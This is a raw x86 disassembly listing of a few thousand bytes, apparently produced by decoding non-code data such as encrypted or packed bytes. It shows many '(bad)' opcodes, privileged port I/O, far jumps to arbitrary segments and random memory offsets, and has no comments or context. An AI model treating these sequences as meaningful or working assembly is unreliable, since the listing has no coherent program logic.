  40fbe6:	mov    edi,0xf9cc07df
  40fbeb:	mov    al,0x85
  40fbed:	xor    al,0xf
  40fbef:	imul   eax,ebp,0xca2b0b44
  40fbf5:	xor    ecx,DWORD PTR [eax-0x25abe234]
  40fbfb:	add    BYTE PTR [edi],al
  40fbfd:	stc    
  40fbfe:	adc    al,0xc8
  40fc00:	lahf   
  40fc01:	dec    esp
  40fc02:	dec    esi
  40fc03:	mov    dh,0xb9
  40fc05:	scas   eax,DWORD PTR es:[edi]
  40fc06:	repz aam 0xf7
  40fc09:	and    BYTE PTR [ebp-0x61],dl
  40fc0c:	xor    DWORD PTR [edi+0x5b36f7f9],esi
  40fc12:	adc    bl,BYTE PTR [ecx]
  40fc14:	xchg   ebp,eax
  40fc15:	dec    ecx
  40fc16:	mov    esp,0x2b495bf9
  40fc1b:	test   DWORD PTR [ecx],esi
  40fc1d:	sbb    BYTE PTR [eax],ch
  40fc1f:	xor    BYTE PTR [ebp-0x34],bh
  40fc22:	out    0x41,eax
  40fc24:	fdiv   QWORD PTR [eiz*8+0x791c0b7a]
  40fc2b:	jb     0x40fbf1
  40fc2d:	mov    esp,0xb4e96b1f
  40fc32:	sbb    BYTE PTR [ebp+0x79c681ef],0x27
  40fc39:	aad    0x98
  40fc3b:	dec    ebx
  40fc3c:	mov    DWORD PTR [eax-0x75d15fba],edx
  40fc42:	sub    al,0x58
  40fc44:	fcmovb st,st(7)
  40fc46:	xor    ah,BYTE PTR [ebx+0x28f19a5e]
  40fc4c:	sbb    ebx,esi
  40fc4e:	fwait
  40fc4f:	loop   0x40fc34
  40fc51:	inc    esp
  40fc52:	inc    ebx
  40fc53:	push   edi
  40fc54:	mov    esi,0x45627d5
  40fc59:	sub    eax,0x6e677cd3
  40fc5e:	fld    TBYTE PTR [ebp+0x19eb912a]
  40fc65:	push   es
  40fc66:	or     cl,BYTE PTR [edx]
  40fc68:	daa    
  40fc69:	mov    edi,ecx
  40fc6b:	test   DWORD PTR [edx+0x7208cac3],ebx
  40fc71:	add    eax,ebp
  40fc73:	das    
  40fc74:	mov    ecx,0x227e2d9f
  40fc79:	popa   
  40fc7a:	cmp    edi,DWORD PTR ds:0x1efd17e
  40fc80:	jo     0x40fc16
  40fc82:	sbb    bl,BYTE PTR [eax+0x68]
  40fc85:	out    dx,al
  40fc86:	addr16 stc 
  40fc88:	adc    bl,BYTE PTR [esi]
  40fc8a:	cdq    
  40fc8b:	outs   dx,DWORD PTR ds:[esi]
  40fc8c:	pop    edi
  40fc8d:	add    eax,0xd4bf7c55
  40fc92:	cmp    edi,0x23
  40fc95:	outs   dx,DWORD PTR ds:[esi]
  40fc96:	push   0x5a1a2ffd
  40fc9b:	shr    BYTE PTR [ecx+esi*8+0xf470fd2],0x57
  40fca3:	or     DWORD PTR [eax*1+0x2e6338c9],0x5
  40fcab:	cmp    ah,0x2b
  40fcae:	(bad)  
  40fcaf:	aad    0x57
  40fcb1:	adc    esp,ecx
  40fcb3:	daa    
  40fcb4:	call   0x76ec:0xfdc8751a
  40fcbb:	xor    eax,0xb4976b41
  40fcc0:	out    dx,eax
  40fcc1:	retf   0x9173
  40fcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc5:	cmp    BYTE PTR [ebp+0x44ccbebe],bh
  40fccb:	ss jl  0x40fc7d
  40fcce:	and    bh,BYTE PTR [esi+0xa0c1f86]
  40fcd4:	pop    esp
  40fcd5:	ins    DWORD PTR es:[edi],dx
  40fcd6:	xor    al,0x81
  40fcd8:	mov    ebx,0x37b9ecdb
  40fcdd:	mov    DWORD PTR [ecx+0x40],ecx
  40fce0:	or     edx,edi
  40fce2:	xlat   BYTE PTR ds:[ebx]
  40fce3:	jno    0x40fd1a
  40fce5:	mov    cl,0x17
  40fce7:	stos   BYTE PTR es:[edi],al
  40fce8:	adc    BYTE PTR [ecx+edx*4+0x5d],dl
  40fcec:	xor    esi,esp
  40fcee:	push   ebx
  40fcef:	mov    ds:0x61f0dc09,al
  40fcf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf5:	push   edi
  40fcf6:	mov    dl,al
  40fcf8:	frstor [ebx-0x80]
  40fcfb:	add    BYTE PTR [esi+edi*2],bh
  40fcfe:	fld    st(4)
  40fd00:	cmp    ah,BYTE PTR [edi]
  40fd02:	sbb    cl,BYTE PTR [eax]
  40fd04:	jmp    0x8099:0xa07da6ed
  40fd0b:	xchg   edi,eax
  40fd0c:	push   edx
  40fd0d:	sub    ecx,DWORD PTR [eax-0x2c]
  40fd10:	jg     0x40fd2d
  40fd12:	xor    eax,0x61cc4610
  40fd17:	dec    ebx
  40fd18:	es xchg esp,eax
  40fd1a:	pop    ds
  40fd1b:	cld    
  40fd1c:	xor    ah,BYTE PTR [edi+eiz*1-0x6ad931a2]
  40fd23:	fucomp st(7)
  40fd25:	pop    ds
  40fd26:	mov    ds:0xf103f3b5,eax
  40fd2b:	outs   dx,DWORD PTR ds:[esi]
  40fd2c:	add    BYTE PTR [edi-0x1],cl
  40fd2f:	inc    edx
  40fd30:	adc    esp,DWORD PTR [ebp-0x76]
  40fd33:	mov    ah,0xb4
  40fd35:	sbb    esp,edx
  40fd37:	mov    edi,DWORD PTR [eax+0x678d3c17]
  40fd3d:	fimul  WORD PTR [ebp+0x52]
  40fd40:	fidivr WORD PTR [ebx]
  40fd42:	mov    dh,0x53
  40fd44:	sub    eax,0xf9f4a5bc
  40fd49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4a:	jne    0x40fdbe
  40fd4c:	and    edx,DWORD PTR [edx-0x1c]
  40fd4f:	cmp    cl,0xeb
  40fd52:	adc    al,0xa0
  40fd54:	fnsave [edx+ecx*4-0x48]
  40fd58:	out    dx,eax
  40fd59:	mov    cl,0x56
  40fd5b:	or     al,0xe3
  40fd5d:	fist   DWORD PTR [edx]
  40fd5f:	ss pop ds
  40fd61:	ror    DWORD PTR [ecx],cl
  40fd63:	test   eax,0xb4219949
  40fd68:	dec    eax
  40fd69:	adc    ebp,DWORD PTR es:[ebx]
  40fd6c:	and    ebx,edx
  40fd6e:	shr    edi,1
  40fd70:	or     eax,0x429bf186
  40fd75:	xor    eax,0xef8c74a
  40fd7a:	out    0xb6,eax
  40fd7c:	xchg   ebp,eax
  40fd7d:	repnz shl ebp,0x73
  40fd81:	mov    edx,0x75d4a69
  40fd86:	ror    BYTE PTR [esi+edi*8],cl
  40fd89:	sub    al,0xe2
  40fd8b:	neg    DWORD PTR [ebx]
  40fd8d:	loope  0x40fd24
  40fd8f:	xlat   BYTE PTR ds:[ebx]
  40fd90:	or     BYTE PTR [esi+edx*8+0x4d4ce65e],al
  40fd97:	arpl   WORD PTR [ebx],bp
  40fd99:	jp     0x40fddd
  40fd9b:	dec    ebx
  40fd9c:	fstp   st(0)
  40fd9e:	mov    eax,ds:0xd3b145e3
  40fda3:	jmp    0x97b2f101
  40fda8:	xor    DWORD PTR [ebx+0x3c],ebx
  40fdab:	xchg   ecx,eax
  40fdac:	repnz iret 
  40fdae:	jg     0x40fdec
  40fdb0:	cwde   
  40fdb1:	and    eax,0x96c5d686
  40fdb6:	mov    al,ds:0xee051597
  40fdbb:	mov    ds:0xabc75b36,al
  40fdc0:	xor    eax,0xec76c1a7
  40fdc5:	jo     0x40fe10
  40fdc7:	sahf   
  40fdc8:	outs   dx,DWORD PTR ds:[esi]
  40fdc9:	jbe    0x40fdef
  40fdcb:	push   esi
  40fdcc:	and    al,0x3a
  40fdce:	or     esi,DWORD PTR [ebp-0x5]
  40fdd1:	xor    DWORD PTR [ecx+eiz*4-0x3d],0x7dd681f4
  40fdd9:	sub    DWORD PTR [esi],eax
  40fddb:	mov    bl,0xe6
  40fddd:	sbb    bh,BYTE PTR [eax]
  40fddf:	cli    
  40fde0:	cli    
  40fde1:	fcmovnu st,st(2)
  40fde3:	sub    eax,0x80723bb4
  40fde8:	arpl   WORD PTR [esi],dx
  40fdea:	(bad)  
  40fdeb:	vpavgb ymm7,ymm7,YMMWORD PTR [ecx-0x22]
  40fdf0:	fidivr WORD PTR [edx+0x78b348c4]
  40fdf6:	test   eax,0xc9af4313
  40fdfb:	mov    edi,DWORD PTR [edx+0x2ece823b]
  40fe01:	add    DWORD PTR [esi],eax
  40fe03:	mov    ecx,0x6088916a
  40fe08:	pushf  
  40fe09:	repnz mov ds:0x2b9271a8,al
  40fe0f:	and    bh,BYTE PTR [eax-0x2067bf43]
  40fe15:	test   DWORD PTR [ecx+0x5bd38555],esi
  40fe1b:	cld    
  40fe1c:	xor    bl,cl
  40fe1e:	mov    es,WORD PTR [eax+0x79d8a51c]
  40fe24:	sub    ecx,DWORD PTR [edx-0x2c8e0879]
  40fe2a:	pop    ds
  40fe2b:	xchg   ebx,eax
  40fe2c:	xchg   bh,ch
  40fe2e:	mov    WORD PTR [edx+0x26],ss
  40fe31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe32:	das    
  40fe33:	mov    ds:0x8b1618f4,eax
  40fe38:	aas    
  40fe39:	std    
  40fe3a:	jmp    0xb904:0x7d3b5eff
  40fe41:	push   edx
  40fe42:	or     dl,bh
  40fe44:	and    eax,0xa46a654f
  40fe49:	or     cl,BYTE PTR [eax+0x78]
  40fe4c:	cmp    eax,0x760943b0
  40fe51:	and    eax,0xe0d91b68
  40fe56:	xor    edi,DWORD PTR [edx-0x7c]
  40fe59:	dec    esi
  40fe5a:	dec    edx
  40fe5b:	mov    ecx,edx
  40fe5d:	scas   eax,DWORD PTR es:[edi]
  40fe5e:	stc    
  40fe5f:	mov    ebp,0x9bd7b829
  40fe64:	test   DWORD PTR [edi+eiz*4-0x72],0xca814eea
  40fe6c:	push   ds
  40fe6d:	xchg   ebx,eax
  40fe6e:	or     DWORD PTR [edi],esp
  40fe70:	test   al,0x48
  40fe72:	jmp    0x40fe07
  40fe74:	call   0x9ac1195a
  40fe79:	mov    dl,0xaa
  40fe7b:	push   esi
  40fe7c:	xor    ebp,ebp
  40fe7e:	sub    al,0xec
  40fe80:	and    DWORD PTR [ecx+0x6f],eax
  40fe83:	add    al,0xe6
  40fe85:	push   ss
  40fe86:	xchg   esi,eax
  40fe87:	lock cmp dl,BYTE PTR [eax+0x53]
  40fe8b:	dec    esi
  40fe8c:	mov    gs,WORD PTR [ecx]
  40fe8e:	fsubr  st(5),st
  40fe90:	mov    eax,0x3a8dae92
  40fe95:	outs   dx,BYTE PTR ds:[esi]
  40fe96:	mov    esi,0x15c5ad0
  40fe9b:	push   edx
  40fe9c:	call   0x30db0064
  40fea1:	or     DWORD PTR [ecx-0x29],eax
  40fea4:	enter  0x7877,0x59
  40fea8:	je     0x40ff07
  40feaa:	stos   DWORD PTR es:[edi],eax
  40feab:	gs nop
  40fead:	sbb    al,BYTE PTR [ebx+0x71ae7a9f]
  40feb3:	jbe    0x40fe9e
  40feb5:	mov    ds:0x967dc2fc,eax
  40febb:	mov    BYTE PTR [eax-0x43a9bca5],dl
  40fec1:	add    eax,0xf5b7e9c8
  40fec6:	add    DWORD PTR [esp+ecx*4-0x13],ebp
  40feca:	mov    edi,?
  40fecc:	and    esi,DWORD PTR [edi+0x64]
  40fecf:	cld    
  40fed0:	mov    al,ds:0x82167f72
  40fed5:	mov    bl,0x1
  40fed7:	ss js  0x40ff2b
  40feda:	shl    ebx,1
  40fedc:	mov    al,0x43
  40fede:	mov    ch,0x44
  40fee0:	js     0x40fe8a
  40fee2:	inc    edx
  40fee3:	or     ecx,ecx
  40fee5:	(bad)  
  40fee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee7:	leave  
  40fee8:	outs   dx,DWORD PTR ds:[esi]
  40fee9:	popf   
  40feea:	outs   dx,DWORD PTR ds:[esi]
  40feeb:	sub    BYTE PTR [esi-0x1602526f],bh
  40fef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef2:	mov    al,ds:0x5235fbcd
  40fef7:	(bad)  
  40fef8:	pop    eax
  40fef9:	push   ds
  40fefa:	shl    edx,1
  40fefc:	aam    0x44
  40fefe:	add    DWORD PTR ds:[ebp+0x418d24ae],esi
  40ff05:	add    BYTE PTR [edi+0x1606151f],al
  40ff0b:	enter  0x4da7,0x17
  40ff0f:	ja     0x40ff10
  40ff11:	dec    esp
  40ff12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff13:	stos   DWORD PTR es:[edi],eax
  40ff14:	and    edx,DWORD PTR [ecx]
  40ff16:	xor    edx,ecx
  40ff18:	loop   0x40fecd
  40ff1a:	inc    esp
  40ff1b:	test   bl,ch
  40ff1d:	ficom  DWORD PTR [edx-0x1b]
  40ff20:	or     ch,dl
  40ff22:	(bad)  
  40ff23:	jbe    0x40ff71
  40ff25:	sbb    al,0x1b
  40ff27:	and    BYTE PTR cs:[ebp+0x4e],al
  40ff2b:	imul   ebp,DWORD PTR [esi-0x5b4607b],0xf2642f3a
  40ff35:	and    ebp,DWORD PTR [edi+edx*8]
  40ff38:	out    0x39,eax
  40ff3a:	fistp  QWORD PTR [edx]
  40ff3c:	xchg   edx,eax
  40ff3d:	xor    ebp,ebx
  40ff3f:	mov    edi,0x81178497
  40ff44:	retf   
  40ff45:	imul   esp,DWORD PTR [edi+0x27],0x3
  40ff49:	mov    ds:0x58d64e7a,eax
  40ff4e:	or     al,0xbb
  40ff50:	pop    edx
  40ff51:	mov    ebp,0xbd1aafbc
  40ff56:	in     al,dx
  40ff57:	sbb    eax,0x6edac045
  40ff5c:	iret   
  40ff5d:	xor    ch,0x74
  40ff60:	mov    edx,0xe987d2f0
  40ff65:	(bad)  
  40ff66:	mov    bh,BYTE PTR [ebx-0x46]
  40ff69:	dec    esi
  40ff6a:	pop    eax
  40ff6b:	cmp    edx,esp
  40ff6d:	jmp    0x9c9c:0x1d5bc1d0
  40ff74:	fadd   DWORD PTR [esi+0x2370c326]
  40ff7a:	and    DWORD PTR [ebx],edi
  40ff7c:	and    ebx,eax
  40ff7e:	or     eax,0x55b3fabc
  40ff83:	inc    ebp
  40ff84:	and    cl,bh
  40ff86:	mov    bl,0x14
  40ff88:	mov    esp,0xfc17dfe9
  40ff8d:	loop   0x40ffa2
  40ff8f:	stc    
  40ff90:	mov    ah,0x4e
  40ff92:	outs   dx,DWORD PTR ds:[esi]
  40ff93:	sub    eax,0xec77f39
  40ff98:	nop
  40ff99:	mov    al,ds:0x67be133b
  40ff9e:	fwait
  40ff9f:	mov    bh,BYTE PTR [eax+edx*4+0x2e]
  40ffa3:	mov    ds:0xaa0c494f,al
  40ffa8:	ror    ebx,1
  40ffaa:	icebp  
  40ffab:	gs je  0x40ffaa
  40ffae:	scas   eax,DWORD PTR es:[edi]
  40ffaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb0:	xchg   edx,eax
  40ffb1:	fdivrp st(5),st
  40ffb3:	jo     0x40ff4a
  40ffb5:	cs imul edi,ebp,0xfffffff9
  40ffb9:	addr16 mov bl,0x8
  40ffbc:	mov    ds:0xb5aae779,al
  40ffc1:	adc    ebp,ebx
  40ffc3:	fsub   QWORD PTR [esi]
  40ffc5:	enter  0xb7bf,0x75
  40ffc9:	or     eax,0xd6c36613
  40ffce:	test   eax,0x185c4dde
  40ffd3:	fwait
  40ffd4:	pusha  
  40ffd5:	test   BYTE PTR [ecx],bl
  40ffd7:	jae    0x410016
  40ffd9:	xchg   ebx,ecx
  40ffdb:	jmp    0x50cc0686
  40ffe0:	jp     0x41000f
  40ffe2:	aas    
  40ffe3:	xchg   esp,eax
  40ffe4:	(bad)  
  40ffe5:	sbb    eax,0x7100d61f
  40ffea:	stos   BYTE PTR es:[edi],al
  40ffeb:	mov    bl,0x45
  40ffed:	mov    ch,0x11
  40ffef:	ds adc eax,0xb82bfb4d
  40fff5:	aaa    
  40fff6:	sub    eax,0xf8d0cb8b
  40fffb:	les    edi,FWORD PTR [edx]
  40fffd:	dec    esi
  40fffe:	ja     0x40fff3
  410000:	dec    esi
  410001:	xor    bh,dh
  410003:	push   0x366bf773
  410008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410009:	inc    ecx
  41000a:	add    eax,0xf3d9ad87
  41000f:	lods   eax,DWORD PTR ds:[esi]
  410010:	stos   BYTE PTR es:[edi],al
  410011:	jge    0x40ffd2
  410013:	bound  edi,QWORD PTR [edx-0x5]
  410016:	enter  0x8bb2,0x1d
  41001a:	jl     0x40ffe1
  41001c:	adc    eax,0xe13716b6
  410021:	xchg   cl,cl
  410023:	aad    0x52
  410025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410026:	adc    edx,DWORD PTR [edi]
  410028:	and    ah,dl
  41002a:	les    ecx,FWORD PTR [edx]
  41002c:	ret    
  41002d:	jle    0x41003b
  41002f:	push   ds
  410030:	loop   0x410091
  410032:	pop    ss
  410033:	lea    esp,[ebx+0x6d]
  410036:	leave  
  410037:	loop   0x41003a
  410039:	into   
  41003a:	jns    0x410051
  41003c:	jmp    0x1231:0x869bdd6d
  410043:	jp     0x40fff8
  410045:	and    al,dh
  410047:	push   es
  410048:	xor    eax,0xdc4773cd
  41004d:	stos   DWORD PTR es:[edi],eax
  41004e:	ss mov ecx,0x85d5c57f
  410054:	fwait
  410055:	mov    WORD PTR [eax],?
  410057:	pop    edx
  410058:	mov    esp,0xa8ae4d64
  41005d:	lods   al,BYTE PTR ds:[esi]
  41005e:	jne    0x410054
  410060:	pop    edx
  410061:	sub    al,0xde
  410063:	sbb    eax,0x5eb44104
  410068:	cli    
  410069:	pop    ss
  41006a:	es jnp 0x4100b5
  41006d:	xor    DWORD PTR [edx+0x6b3c945f],ebx
  410073:	int3   
  410074:	pop    ebp
  410075:	cmp    DWORD PTR [eax],edx
  410077:	add    DWORD PTR [edx+esi*4],edi
  41007a:	mov    dh,0x13
  41007c:	ja     0x410005
  41007e:	xor    cl,BYTE PTR [ecx-0x5e6107ad]
  410084:	shl    esi,0x47
  410087:	xchg   ebp,eax
  410088:	mov    BYTE PTR ds:0xa1280094,dl
  41008e:	mov    ecx,0xf0523365
  410093:	sub    BYTE PTR [edx+eiz*2],ah
  410096:	push   ebx
  410097:	xchg   DWORD PTR [edx+0x3419ab5],ebx
  41009d:	dec    esp
  41009e:	aas    
  41009f:	push   ecx
  4100a0:	dec    ecx
  4100a1:	add    esp,eax
  4100a3:	xor    BYTE PTR [ebp+0xf],al
  4100a6:	aam    0x1c
  4100a8:	dec    eax
  4100a9:	loope  0x41011c
  4100ab:	fcmovnb st,st(5)
  4100ad:	cmp    ebx,ecx
  4100af:	pop    DWORD PTR [edx]
  4100b1:	das    
  4100b2:	adc    dh,BYTE PTR [ecx]
  4100b4:	xor    ebp,ecx
  4100b6:	mov    ds:0xa2e5cea5,eax
  4100bb:	imul   edi,DWORD PTR [edx-0x47],0xffffffd1
  4100bf:	std    
  4100c0:	cmp    al,0xe8
  4100c2:	inc    edi
  4100c3:	pop    edx
  4100c4:	push   edi
  4100c5:	xor    ecx,DWORD PTR [esp+esi*8-0xf]
  4100c9:	add    DWORD PTR [edx-0x5d],esp
  4100cc:	mov    edi,0x9456d94b
  4100d1:	clc    
  4100d2:	aas    
  4100d3:	mov    ds:0xd866a6c0,al
  4100d8:	(bad)  
  4100d9:	mov    eax,0x3fba0b28
  4100de:	add    edi,DWORD PTR [edi]
  4100e0:	test   DWORD PTR [ecx],ecx
  4100e2:	in     eax,0x43
  4100e4:	add    eax,0x883d7e5f
  4100e9:	push   ss
  4100ea:	jmp    0xa543:0x8ac70195
  4100f1:	scas   eax,DWORD PTR es:[edi]
  4100f2:	fcmovnbe st,st(5)
  4100f4:	adc    cl,bh
  4100f6:	(bad)  
  4100f7:	jns    0x41009c
  4100f9:	dec    ebx
  4100fa:	push   edx
  4100fb:	cmp    BYTE PTR [ebx-0x21],al
  4100fe:	and    dh,ah
  410100:	icebp  
  410101:	adc    BYTE PTR [eax+edx*8],ah
  410104:	pop    ss
  410105:	in     al,dx
  410106:	inc    edx
  410107:	push   cs
  410108:	lahf   
  410109:	retf   0x4491
  41010c:	fmul   st,st(5)
  41010e:	mov    ebp,0x4d26b32
  410113:	or     ah,ch
  410115:	sbb    DWORD PTR [esi],0xe2777042
  41011b:	or     al,0x60
  41011d:	cld    
  41011e:	or     eax,0xeee5a48a
  410123:	xchg   ecx,eax
  410124:	inc    esp
  410125:	sub    ecx,DWORD PTR [ebx-0x7aadd61e]
  41012b:	pop    es
  41012c:	sub    DWORD PTR [eax-0x6c],esp
  41012f:	stos   DWORD PTR es:[edi],eax
  410130:	bound  edx,QWORD PTR ds:[ecx-0x6420400]
  410137:	nop
  410138:	aad    0x79
  41013a:	dec    si
  41013c:	and    ebx,DWORD PTR [ebx]
  41013e:	fs out dx,eax
  410140:	scas   eax,DWORD PTR es:[edi]
  410141:	pop    edi
  410142:	add    DWORD PTR [esi],0xcad73a82
  410148:	mul    DWORD PTR [ecx-0xd]
  41014b:	dec    ecx
  41014c:	rcl    DWORD PTR [edi-0x42],1
  41014f:	leave  
  410150:	ins    BYTE PTR es:[edi],dx
  410151:	mov    eax,ds:0xd11163eb
  410156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410157:	mov    al,0x8d
  410159:	cmp    al,0xd9
  41015b:	dec    ebx
  41015c:	fisub  WORD PTR [edx+0x31]
  41015f:	ret    0xabc4
  410162:	(bad)  
  410163:	stos   BYTE PTR es:[edi],al
  410164:	and    dl,BYTE PTR [edi-0x10]
  410167:	add    DWORD PTR [esi],ebx
  410169:	inc    edi
  41016a:	sub    DWORD PTR [edx+0x11],ebx
  41016d:	xchg   edi,eax
  41016e:	add    ebp,0xfa842e7
  410174:	xchg   DWORD PTR [ebp-0x674c4d9d],edx
  41017a:	test   DWORD PTR [esi],esi
  41017c:	jmp    0x90ba:0x47458153
  410183:	xchg   edi,eax
  410184:	repnz pushf 
  410186:	jg     0x410188
  410188:	imul   ebp,DWORD PTR [eax-0x3ced72df],0xa80f4d91
  410192:	mov    ebp,esi
  410194:	jbe    0x4101c3
  410196:	inc    ebp
  410197:	jp     0x410170
  410199:	(bad)  
  41019a:	imul   ebx,DWORD PTR [ebp-0xb264937],0xdc8f4da4
  4101a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a5:	push   ecx
  4101a6:	jne    0x4101b5
  4101a8:	pop    ecx
  4101a9:	inc    ebx
  4101aa:	sbb    eax,0x2a3ed252
  4101af:	jg     0x41019c
  4101b1:	fcom   DWORD PTR [ecx+0x21ac2d1f]
  4101b7:	mov    al,ds:0xd5ea5b1c
  4101bc:	clc    
  4101bd:	je     0x410196
  4101bf:	scas   eax,DWORD PTR es:[edi]
  4101c0:	loop   0x410205
  4101c2:	in     al,0x7a
  4101c4:	xchg   BYTE PTR [edi+0x79],dl
  4101c7:	pop    ebp
  4101c8:	sbb    BYTE PTR [ecx],ch
  4101ca:	call   0xdd87a1c0
  4101cf:	pop    esi
  4101d0:	sbb    al,0x57
  4101d2:	mov    edi,0x27c40629
  4101d7:	out    dx,al
  4101d8:	cmp    DWORD PTR [ebp+0x5c],edi
  4101db:	popf   
  4101dc:	fs inc edi
  4101de:	or     al,0x71
  4101e0:	xor    dl,dh
  4101e2:	sub    bl,BYTE PTR [esi]
  4101e4:	out    dx,eax
  4101e5:	adc    eax,0x73bf7524
  4101ea:	or     DWORD PTR [esi+edi*2+0x377e0ec],eax
  4101f1:	cmp    al,dl
  4101f3:	gs push ebp
  4101f5:	add    BYTE PTR [esp+edx*2+0xc14c6d3],bh
  4101fc:	std    
  4101fd:	cli    
  4101fe:	xchg   esp,eax
  4101ff:	inc    ebx
  410200:	or     eax,0x750a5af4
  410205:	data16 aam 0x3f
  410208:	mov    ds:0x39867dfc,al
  41020d:	add    esi,edx
  41020f:	jb     0x4101f1
  410211:	je     0x4101c3
  410213:	out    dx,eax
  410214:	add    ah,ch
  410216:	ror    BYTE PTR [ebp-0x49],0x7f
  41021a:	sbb    bl,al
  41021c:	frstor [ebp-0x1c]
  41021f:	pop    esp
  410220:	out    dx,eax
  410221:	dec    eax
  410222:	xor    ebx,DWORD PTR [edx]
  410224:	int3   
  410225:	xchg   esi,eax
  410226:	inc    ecx
  410227:	cmp    BYTE PTR [ebx+edx*4-0x7624e479],0x10
  41022f:	nop
  410230:	hlt    
  410231:	cmp    edi,esi
  410233:	inc    edi
  410234:	pop    eax
  410235:	add    eax,0xee804c5
  41023a:	scas   eax,DWORD PTR es:[edi]
  41023b:	shr    DWORD PTR [esi-0x52],0x56
  41023f:	(bad)  
  410240:	mov    cl,0x2b
  410242:	or     bh,BYTE PTR [esi]
  410244:	ja     0x410253
  410246:	(bad)  
  410247:	loope  0x410216
  410249:	sahf   
  41024a:	mov    edx,esi
  41024c:	sub    al,cl
  41024e:	mov    al,ds:0xaee90dde
  410253:	mov    esp,0x6e1a8d4e
  410258:	sbb    DWORD PTR [eax-0x23],eax
  41025b:	popf   
  41025c:	add    eax,0x618f3b82
  410261:	popa   
  410262:	mov    es,WORD PTR ds:0x1792b4be
  410268:	pop    ebx
  410269:	imul   ebp,DWORD PTR [ebp-0x45dddcc6],0x251886e9
  410273:	lahf   
  410274:	jle    0x4102eb
  410276:	popf   
  410277:	mov    WORD PTR [eax],gs
  410279:	inc    esp
  41027a:	add    bh,dl
  41027c:	imul   edi,DWORD PTR [ebx+0x370fe588],0xe10b0969
  410286:	scas   al,BYTE PTR es:[edi]
  410287:	setbe  BYTE PTR [ecx]
  41028a:	loope  0x410262
  41028c:	push   cs
  41028d:	mov    dh,0x64
  41028f:	mov    eax,0x89b59a10
  410294:	pop    ebx
  410295:	(bad)  
  410297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410298:	(bad)  
  410299:	icebp  
  41029a:	fld    QWORD PTR [ebp+ecx*2-0x3]
  41029e:	neg    DWORD PTR [ebx-0x7f05ac8e]
  4102a4:	fs xchg ebp,eax
  4102a6:	scas   al,BYTE PTR es:[edi]
  4102a7:	repz daa 
  4102a9:	daa    
  4102aa:	push   0xffffff85
  4102ac:	cmp    esp,esp
  4102ae:	cli    
  4102af:	sbb    ah,BYTE PTR [edx]
  4102b1:	(bad)  
  4102b2:	sub    DWORD PTR [edx+0x4fdb3f5b],esi
  4102b8:	fdivr  DWORD PTR [esi+0x1e42a67a]
  4102be:	cmp    ebp,DWORD PTR ds:0x431e1bbf
  4102c4:	pop    ebp
  4102c5:	mov    ebp,0xd6bd72ca
  4102ca:	(bad)  
  4102cb:	pop    esi
  4102cc:	sub    al,0x3b
  4102ce:	test   eax,0xffcc0c57
  4102d3:	jne    0x41030d
  4102d5:	ficom  WORD PTR [ebp+ebx*4-0x50]
  4102d9:	sbb    DWORD PTR [ebx+0x4fefa82c],0xcdde57ae
  4102e3:	js     0x410278
  4102e5:	pop    es
  4102e6:	sbb    eax,0x6ec59fcf
  4102eb:	pop    ebx
  4102ec:	push   ebp
  4102ed:	(bad)  
  4102ee:	shl    BYTE PTR [ebx],1
  4102f0:	ret    
  4102f1:	mov    esi,0x3459c1cc
  4102f6:	rcr    esi,1
  4102f8:	add    BYTE PTR [eax-0x6b913f5f],dl
  4102fe:	(bad)  [edx-0xb647262]
  410304:	in     eax,dx
  410305:	dec    edi
  410306:	or     DWORD PTR es:[eax+edi*4-0x71],eax
  41030b:	sti    
  41030c:	cmp    dl,bh
  41030e:	(bad)  
  41030f:	aam    0x27
  410311:	lds    esp,FWORD PTR [ebp-0x2f]
  410314:	push   edx
  410315:	mov    eax,ds:0xd678611b
  41031a:	and    dh,bl
  41031c:	icebp  
  41031d:	xchg   esp,eax
  41031e:	pop    edi
  41031f:	xchg   edi,eax
  410320:	xchg   ebx,eax
  410321:	push   ecx
  410322:	in     al,0x7a
  410324:	retf   
  410325:	add    eax,0xfe474c04
  41032a:	call   0x4b9b:0xf8b86705
  410331:	push   0x79969600
  410336:	sub    edx,DWORD PTR cs:[ebp+0x2f]
  41033a:	repnz dec eax
  41033c:	cld    
  41033d:	fiadd  WORD PTR [edi+0x447e9c01]
  410343:	jns    0x4102f0
  410345:	push   esi
  410346:	inc    edi
  410347:	push   es
  410348:	push   ecx
  410349:	mov    dl,0xd7
  41034b:	(bad)  
  41034c:	pop    ecx
  41034d:	mov    eax,ds:0xfce4f8b7
  410352:	cmp    al,0x41
  410354:	jmp    0x41030f
  410356:	fnstsw WORD PTR [ecx+0x23ca1f31]
  41035c:	fst    QWORD PTR [edx+0x3d]
  41035f:	sub    DWORD PTR [eax+0x7d11e383],esi
  410365:	cdq    
  410366:	ins    DWORD PTR es:[edi],dx
  410367:	xor    BYTE PTR [esi+ecx*8-0x10431d2e],0xfa
  41036f:	fistp  QWORD PTR [esi+0x30bd27d5]
  410375:	cli    
  410376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410377:	dec    BYTE PTR [edi+0x233e372a]
  41037d:	fdivr  DWORD PTR [edx]
  41037f:	push   edx
  410380:	mov    ecx,0xa9dbbc19
  410385:	adc    eax,0xcb9cfe78
  41038a:	cdq    
  41038b:	jno    0x4103e9
  41038d:	gs cs in al,0xf0
  410391:	(bad)  
  410392:	aad    0xb
  410394:	sbb    BYTE PTR ds:0x386d8303,0x70
  41039b:	ja     0x4103bc
  41039d:	sbb    eax,0xb8f78ff7
  4103a2:	cli    
  4103a3:	push   esp
  4103a4:	daa    
  4103a5:	adc    BYTE PTR [edi-0x62ce3df6],dl
  4103ab:	add    ah,BYTE PTR [edx-0x4e]
  4103ae:	daa    
  4103af:	retf   
  4103b0:	pop    esp
  4103b1:	push   ecx
  4103b2:	xchg   edx,eax
  4103b3:	sbb    DWORD PTR [esi],0xffffffb8
